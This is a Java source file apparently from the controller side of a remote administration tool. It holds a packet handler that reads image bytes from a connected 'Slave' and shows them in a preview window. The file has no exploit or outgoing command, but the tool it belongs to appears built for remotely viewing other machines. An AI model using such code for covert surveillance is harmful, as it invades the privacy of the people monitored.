package com.redpois0n.packets;

import java.awt.Graphics;
import java.awt.image.BufferedImage;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FramePreviewImage;
import com.redpois0n.utils.ImageUtils;


public class PacketIC extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		FramePreviewImage frame = FramePreviewImage.instances.get(slave);
		if (frame != null) {
			int imageSize = slave.readInt();
			int w = slave.readInt();
			int h = slave.readInt();

			BufferedImage image = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB);

			Graphics imageGraphics = image.getGraphics();

			byte[] buffer = new byte[imageSize];

			slave.getDataInputStream().readFully(buffer);

			BufferedImage img = ImageUtils.decodeImage(buffer);
			imageGraphics.drawImage(img, 0, 0, w, h, null);

			frame.getPanel().image = image;
			frame.getPanel().repaint();
			
			frame.setButtonEnabled(true);
		}
	}

}
